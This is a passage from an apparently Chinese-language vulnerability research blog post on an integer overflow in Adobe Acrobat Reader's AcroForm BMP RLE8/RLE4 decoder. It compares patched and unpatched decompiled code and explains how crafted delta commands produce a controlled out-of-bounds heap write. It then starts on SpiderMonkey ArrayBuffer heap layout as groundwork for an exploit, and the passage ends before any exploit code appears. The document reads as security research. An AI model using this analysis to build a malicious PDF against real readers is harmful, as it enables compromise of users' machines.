class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F in AcroForm 2019.012.20035</span></span><br><span class="line"><span class="keyword">if</span> ( v131 &gt;= v26 || (<span class="keyword">unsigned</span> __int8)v127 + v43 &gt; v123 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">v56 = (<span class="keyword">unsigned</span> __int8)v130 + v43;</span><br><span class="line"><span class="keyword">if</span> ( v134 &gt;= v26 || v56 &gt; v126 || v56 &lt; v43 || v56 &lt; (<span class="keyword">unsigned</span> __int8)v130 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>很明显，这里增加了对整数溢出的判断。</p><h3 id="4-2-漏洞分析"><a href="#4-2-漏洞分析" class="headerlink" title="4.2 漏洞分析"></a>4.2 漏洞分析</h3><p>好在网上已经有了针对 CVE-2013-2729 的详细分析报告（参考 <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a>），基于此可以快速理解函数 <code>sub_20CF3E5F</code> 中相关代码的含义。</p><h4 id="4-2-1-RLE8-解析"><a href="#4-2-1-RLE8-解析" class="headerlink" title="4.2.1 RLE8 解析"></a>4.2.1 RLE8 解析</h4><p>函数 <code>sub_20CF3E5F</code> 中负责解析 RLE8 压缩数据的部分代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">1</span> )  <span class="comment">// RLE8 算法</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, 从左往右</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, 从下往上</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// 读取 2 字节数据</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                         <span class="comment">// 第一个字节不为零</span></span><br><span class="line">      &#123;                                         <span class="comment">// 表示有压缩数据等待处理</span></span><br><span class="line">        <span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            line[xpos++] = BYTE1(cmd);</span><br><span class="line">            ++index;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// 展开数据</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )        <span class="comment">// 第一字节为零且第二字节不为零</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )      <span class="comment">// 位图结束</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta 数据</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;           <span class="comment">// 向右移动</span></span><br><span class="line">          ypos -= ydelta;           <span class="comment">// 向上移动</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">// 未压缩数据</span></span><br><span class="line">        &#123;</span><br><span class="line">          dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">               dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// 整数溢出检查</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">              line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              line[xpos++] = value;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              ++index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( index &lt; BYTE1(cmd) );   <span class="comment">// 读取未压缩数据</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( count &amp; <span class="number">1</span> )                  <span class="comment">// 数据对齐</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// 当前行结束</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// 从下往上移动一行</span></span><br><span class="line">        xpos = <span class="number">0</span>;                           <span class="comment">// 移动到行的起点</span></span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于前面的补丁分析，很明显下面的 <code>if</code> 语句中存在整数溢出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F AcroForm 2019.012.20036 中修复的基本块</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width || </span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>这里在计算 <code>(unsigned __int8)cmd + xpos</code> 时可能导致整数溢出，且其中两个变量的值都可以被控制。在解析特定的 RLE8 数据时，如果触发这里的整数溢出，后续便可以实现堆块越界写。</p><ol><li>变量 <code>(unsigned __int8)cmd</code> 的值是可以直接控制的，其取值范围为 <code>[1, 255]</code> </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// 读取 2 字节数据</span></span><br></pre></td></tr></table></figure><ol start="2"><li>变量 <code>xpos</code> 的值也是可以直接控制的，只需要在 <strong>编码模式</strong> 中布局大量 <code>delta</code> 命令即可使得 <code>xpos</code> 的值接近 <code>0xFFFFFFFF</code> </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">&#123;</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">  xpos += xdelta;           <span class="comment">// 向右移动, xdelta 取值范围为 [0, 255]</span></span><br><span class="line">  ypos -= ydelta;           <span class="comment">// 向上移动</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>因为 <code>xpos</code> 非常大（有符号表示为负数），因此在处理 RLE8 压缩数据时可以实现堆块越界写（往低地址方向越界写），并且写的数据也是完全可控的，只不过所有数据都必须是同样的值</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// 可控数据实现堆块越界写</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// 解压数据</span></span><br></pre></td></tr></table></figure><h4 id="4-2-2-RLE4-解析"><a href="#4-2-2-RLE4-解析" class="headerlink" title="4.2.2 RLE4 解析"></a>4.2.2 RLE4 解析</h4><p>函数 <code>sub_20CF3E5F</code> 中负责解析 RLE4 压缩数据的部分代码如下（实现 RLE4 解压的代码比 RLE8 解压的代码稍微复杂一点，因为数据单位不再是一个字节，而是半个字节）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">2</span> )  <span class="comment">// RLE4 算法</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, 从左往右</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, 从下往上</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  odd_index_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fn_feof(v1[<span class="number">2</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);       <span class="comment">// 读取 2 字节数据</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                     <span class="comment">// 第一个字节不为零</span></span><br><span class="line">      &#123;                                     <span class="comment">// 表示有压缩数据等待处理</span></span><br><span class="line">        high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// 高 4 位数据</span></span><br><span class="line">        low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// 低 4 位数据</span></span><br><span class="line">        <span class="comment">// 20CF45F8 变动的基本块之一</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          xpos_ = odd_index_;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            odd_index = index &amp; <span class="number">1</span>;</span><br><span class="line">            line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            _4bits = high_4bits;            <span class="comment">// 偶数索引 -&gt; 高 4 位数据</span></span><br><span class="line">            <span class="keyword">if</span> ( odd_index )                <span class="comment">// 奇数索引 -&gt; 低 4 位数据</span></span><br><span class="line">              _4bits = low_4bits;</span><br><span class="line">            <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )                <span class="comment">// xpos 为奇数, 存入已有字节</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] |= _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                            <span class="comment">// xpos 为偶数, 存入新的字节</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            ++xpos_;</span><br><span class="line">            index = index + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br><span class="line">          odd_index_ = xpos_;</span><br><span class="line">          xpos = odd_index_;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )                <span class="comment">// 第一字节为零且第二字节不为零</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )              <span class="comment">// 位图结束</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> )         <span class="comment">// delta 数据</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;                   <span class="comment">// 向右移动</span></span><br><span class="line">          ypos -= ydelta;                   <span class="comment">// 向上移动</span></span><br><span class="line">          odd_index_ = xpos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 20CF44EA 变动的基本块之一</span></span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          odd_index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )                 <span class="comment">// 未压缩数据</span></span><br><span class="line">          &#123;</span><br><span class="line">            xpos_ = odd_index_;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              odd_index_ = index &amp; <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !(index &amp; <span class="number">1</span>) )           <span class="comment">// 读取 1 字节数据</span></span><br><span class="line">              &#123;</span><br><span class="line">                fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">                low_4bits_ = value &amp; <span class="number">0xF</span>;   <span class="comment">// 低 4 位数据</span></span><br><span class="line">                high_4bits_ = value &gt;&gt; <span class="number">4</span>;   <span class="comment">// 高 4 位数据</span></span><br><span class="line">              &#125;</span><br><span class="line">              byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">              line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              _4bits = high_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index_ )</span><br><span class="line">                _4bits = low_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] |= _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              ++xpos_;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              not_ended = odd_index++ + <span class="number">1</span> &lt; BYTE1(cmd);</span><br><span class="line">              index = odd_index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( not_ended );</span><br><span class="line">            odd_index_ = xpos_;</span><br><span class="line">            xpos = odd_index_;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( (count &amp; <span class="number">3u</span>) - <span class="number">1</span> &lt;= <span class="number">1</span> )      <span class="comment">// 数据对齐</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// 当前行结束</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// 从下往上移动一行</span></span><br><span class="line">        xpos = <span class="number">0</span>;                           <span class="comment">// 移动到行的起点</span></span><br><span class="line">        odd_index_ = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof((_DWORD *)v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在两个位置可以触发整数溢出，其中一处位于处理压缩数据的过程中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// 高 4 位数据</span></span><br><span class="line">low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// 低 4 位数据</span></span><br><span class="line"><span class="comment">// 20CF45F8 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>另一处位于处理未压缩数据的过程中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF44EA 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05. 漏洞利用"></a>0x05. 漏洞利用</h2><h3 id="5-1-溢出目标"><a href="#5-1-溢出目标" class="headerlink" title="5.1 溢出目标"></a>5.1 溢出目标</h3><p>前面提到在解析 RLE 数据时发现了 3 个溢出点，这里选择其中相对容易写利用的溢出点来触发漏洞：位于 RLE8 数据解析过程中的一处整数溢出。</p><p>RLE4 数据解析过程中存在的两处溢出点很难实现稳定利用，因为在向扫描线填充像素数据时，偏移值为 <code>xpos</code> 的值除以 <code>2</code> ，此时偏移值最大可以是 <code>0xFFFFFFFF / 2 = 0x7FFFFFFF</code> ，也就意味着仅能向高地址方向实现堆块越界写，而且这个地址上具体是什么数据很难控制。</p><p>而 RLE8 数据解析过程中存在的溢出点就相对好控制一些，因为在向扫描线填充像素数据时，偏移值就是 <code>xpos</code> 本身，这样就可以向低地址方向实现堆块越界写，而且越界写的范围在一定程度上也是可控的。在下面的代码中，<code>(unsigned __int8)cmd</code> 的最大值可以是 <code>0xFF</code> ，为了绕过 <code>if</code> 语句中的条件检查，<code>xpos</code> 的最小值是 <code>0xFFFFFF01</code> （在有符号类型下表示为 <code>-255</code>）。这也就意味着最大可以向低地址方向越界写 <code>0xFF</code> 字节的数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>但需要注意的是，用于越界写的数据必须是一样的，即只能是同一个字节。这会给漏洞利用带来一些额外的问题，后续会对此进行详细讨论。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);</span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br></pre></td></tr></table></figure><h3 id="5-2-SpiderMonkey-基础知识"><a href="#5-2-SpiderMonkey-基础知识" class="headerlink" title="5.2 SpiderMonkey 基础知识"></a>5.2 SpiderMonkey 基础知识</h3><p>Adobe Acrobat Reader DC 所使用的 JavaScript 引擎为 <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> ，在编写利用代码之前，先简单介绍一下相关的基础知识。</p><h4 id="5-2-1-ArrayBuffer"><a href="#5-2-1-ArrayBuffer" class="headerlink" title="5.2.1 ArrayBuffer"></a>5.2.1 ArrayBuffer</h4><p>对 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener">ArrayBuffer</a> 而言，当 <code>byteLength</code> 的大小超过 <code>0x68</code> 时，其底层数据存储区（<strong>backing store</strong>）所在的堆块将通过系统堆申请（<code>ucrtbase!calloc</code>）；当 <code>byteLength</code> 的大小小于等于 <code>0x68</code> 时，堆块从 SpiderMonkey 的私有堆 <strong>tenured heap</strong> 申请。同时，当 <strong>backing store</strong> 独立申请堆块时，需要额外申请 <code>0x10</code> 字节的空间用于存储 <code>ObjectElements</code> 对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;               <span class="comment">// 可以是任意值，通常为 0</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;   <span class="comment">// byteLength</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;            <span class="comment">// view 对象指针</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;              <span class="comment">// 可以是任意值，通常为 0</span></span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对 <code>ArrayBuffer</code> 而言，这里 <code>ObjectElements</code> 的各个成员的名字是没有意义的（因为本来是为 <code>Array</code> 准备的），这里第二个成员 <code>initializedLength</code> 存储 <code>byteLength</code> 的值，第三个成员 <code>capacity</code> 存储关联的 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView</a> 对象的指针，其他成员可以是任意值。</p><p>在 Adobe Acrobat Reader DC 中执行下面的 JavaScript 代码：</p><figure class="highlight 